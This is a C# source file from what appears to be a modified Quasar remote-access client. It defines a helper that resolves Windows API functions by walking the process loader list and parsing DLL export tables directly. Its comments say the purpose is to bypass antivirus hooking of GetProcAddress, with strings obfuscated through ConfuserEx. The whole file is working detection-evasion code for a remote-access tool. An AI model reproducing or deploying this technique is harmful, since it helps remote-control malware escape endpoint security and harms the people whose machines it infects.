using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    internal static partial class ClientNatives
    {
        private static Dictionary<int, IntPtr> addresses = new Dictionary<int, IntPtr>();

        internal static void LoadNatives()
        {
            LoadLibrary("user32.dll");
            LoadLibrary("gdi32.dll");
            LoadLibrary("iphlpapi.dll");
        }

        // Self-implemented GetProcAddress (bypass Antivirus GetProcAddress hooking)
        // 고마워요, 정성태님!
        //https://www.sysnet.pe.kr/2/0/12101
        internal static T Lookup<T>(string module, string proc) // NOTE: The strings will be automatically encrypted using ConfuserEx
        {
            var key = (module + '!' + proc).GetHashCode(); // Address caching
            if (!addresses.TryGetValue(key, out var addr))
            {
                var peb = EnvironmentBlockInfo.GetPeb();
                var ldrData = _PEB_LDR_DATA.Create(peb.Ldr);
                var mod = ldrData.Find(module);
                if (object.Equals(mod, default(_LDR_DATA_TABLE_ENTRY)))
                    Environment.FailFast("Inexistent module: " + module);
                var img = PEImage.ReadFromMemory(mod.DllBase, (int)mod.SizeOfImage);
                var procStr = img.GetExportFunction(proc);
                if (object.Equals(procStr, default(ExportFunctionInfo)))
                    Environment.FailFast("Inexistent proc: " + proc);
                addr = (IntPtr)((ulong)mod.DllBase + procStr.RvaAddress);
                addresses.Add(key, addr);
            }
            return Marshal.GetDelegateForFunctionPointer<T>(addr);
        }
    }
}
